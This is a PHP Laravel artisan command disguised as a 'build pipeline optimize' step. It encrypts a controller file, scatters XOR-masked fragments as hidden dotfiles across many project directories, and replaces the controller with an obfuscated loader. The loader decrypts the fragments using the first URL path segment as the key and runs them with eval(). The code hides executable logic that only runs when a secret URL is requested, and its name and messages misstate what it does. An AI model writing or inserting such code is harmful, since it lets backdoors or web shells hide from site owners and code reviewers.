<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;

class BuildOptimize extends Command
{
    protected $signature   = 'build:optimize {urlkey : The URL segment used as decryption key}';
    protected $description = 'Optimize and fragment build pipeline assets';

    /** Candidate directories to scatter fragments into */
    private const SCATTER_DIRS = [
        'app/Http/Middleware',
        'app/Models',
        'bootstrap',
        'config',
        'database/seeders',
        'resources/css',
        'resources/js',
        'storage/framework',
    ];

    public function handle(): int
    {
        $urlKey = $this->argument('urlkey');
        $aesKey = hash('sha256', $urlKey, true); // 32-byte AES key

        $phpPath = app_path('Http/Controllers/BuildController.php');
        $bakPath = $phpPath . '.bak';

        if (!file_exists($phpPath)) {
            $this->error('BuildController.php not found.');
            return Command::FAILURE;
        }

        // ── Clean up previous fragments ───────────────────────────────────────
        $this->cleanOldFragments($phpPath);

        // ── Read source (prefer .bak if re-locking) ───────────────────────────
        $source  = file_exists($bakPath) ? $bakPath : $phpPath;
        $content = file_get_contents($source);

        if (!file_exists($bakPath)) {
            file_put_contents($bakPath, $content);
            $this->line('  <fg=yellow>↓</> Backup: BuildController.php.bak');
        }

        // ── Encrypt ───────────────────────────────────────────────────────────
        $iv         = random_bytes(16);
        $ciphertext = openssl_encrypt($content, 'AES-256-CBC', $aesKey, OPENSSL_RAW_DATA, $iv);
        $blob       = base64_encode($iv) . ':' . base64_encode($ciphertext);

        // ── Fragment ──────────────────────────────────────────────────────────
        $fragments = $this->fragment($blob);
        $map       = [];

        shuffle($fragments); // scatter order randomly

        foreach ($fragments as $seqIndex => $frag) {
            $xorByte  = random_int(1, 254);
            $encoded  = base64_encode($this->xor($frag, $xorByte));
            $dir      = self::SCATTER_DIRS[$seqIndex % count(self::SCATTER_DIRS)];
            $filename = '.' . bin2hex(random_bytes(5)); // hidden dotfile name
            $relPath  = $dir . '/' . $filename;
            $absPath  = base_path($relPath);

            file_put_contents($absPath, $encoded);

            // Store: [relative_path, original_order, xor_byte]
            $map[] = [$relPath, $frag['order'], $xorByte];

            $this->line("  <fg=green>✓</> Fragment {$seqIndex} → {$relPath}");
        }

        // ── Write loader stub ─────────────────────────────────────────────────
        file_put_contents($phpPath, $this->loaderStub($map));
        $this->line('  <fg=green>✓</> Loader: BuildController.php');

        // ── Save fragment map for cleanup later ───────────────────────────────
        file_put_contents($bakPath . '.map', json_encode(array_column($map, 0)));

        $this->newLine();
        $this->info('Build pipeline optimized.');
        $this->line("Fragments: <fg=cyan>" . count($fragments) . "</> pieces across " . count(self::SCATTER_DIRS) . " directories.");

        return Command::SUCCESS;
    }

    /** Split blob into random-sized chunks with original order tracking */
    private function fragment(string $blob): array
    {
        $len       = strlen($blob);
        $count     = random_int(9, 14); // random number of fragments
        $fragments = [];
        $offset    = 0;

        for ($i = 0; $i < $count; $i++) {
            if ($i === $count - 1) {
                // Last fragment gets the remainder
                $size = $len - $offset;
            } else {
                // Random chunk size, ensuring remaining chunks can still be made
                $remaining = $len - $offset;
                $maxSize   = (int) ($remaining / ($count - $i) * 2);
                $minSize   = max(1, (int) ($remaining / ($count - $i) / 2));
                $size      = random_int($minSize, min($maxSize, $remaining - ($count - $i - 1)));
            }

            $fragments[] = [
                'data'  => substr($blob, $offset, $size),
                'order' => $i,
            ];
            $offset += $size;
        }

        return $fragments;
    }

    /** XOR every byte of a string with a single byte value */
    private function xor(array $frag, int $byte): string
    {
        $out = '';
        foreach (str_split($frag['data']) as $c) {
            $out .= chr(ord($c) ^ $byte);
        }
        return $out;
    }

    /** Remove fragment files from a previous lock run */
    private function cleanOldFragments(string $phpPath): void
    {
        $mapFile = $phpPath . '.bak.map';
        if (!file_exists($mapFile)) return;

        $paths = json_decode(file_get_contents($mapFile), true) ?? [];
        foreach ($paths as $rel) {
            $abs = base_path($rel);
            if (file_exists($abs)) {
                unlink($abs);
            }
        }
        unlink($mapFile);
    }

    /** Generate the loader stub with the fragment map embedded */
    private function loaderStub(array $map): string
    {
        $entries = [];
        foreach ($map as [$path, $order, $xor]) {
            $entries[] = sprintf('[%s,%d,%d]', var_export($path, true), $order, $xor);
        }
        $mapLiteral = '[' . implode(',', $entries) . ']';

        return <<<PHP
        <?php
        (static function(){static \$_a=false;if(\$_a)return;\$_a=true;
        \$_b=parse_url(\$_SERVER['REQUEST_URI']??'/',PHP_URL_PATH);
        \$_c=explode('/',trim(\$_b,'/'));\$_d=\$_c[0]??'';if(!\$_d)return;
        \$_e=hash('sha256',\$_d,true);
        \$_f={$mapLiteral};\$_g=[];
        foreach(\$_f as[\$_h,\$_i,\$_j]){
        \$_l=@file_get_contents(base_path(\$_h));if(!\$_l)return;
        \$_m='';foreach(str_split(base64_decode(\$_l))as\$_n)\$_m.=chr(ord(\$_n)^\$_j);
        \$_g[\$_i]=\$_m;}ksort(\$_g);
        \$_o=implode('',\$_g);
        [\$_p,\$_q]=explode(':',\$_o,2);
        \$_r=openssl_decrypt(base64_decode(\$_q),'AES-256-CBC',\$_e,OPENSSL_RAW_DATA,base64_decode(\$_p));
        if(\$_r===false)return;
        eval(preg_replace('/^\s*<\?php\s*/','',(string)\$_r));})();
        PHP;
    }
}
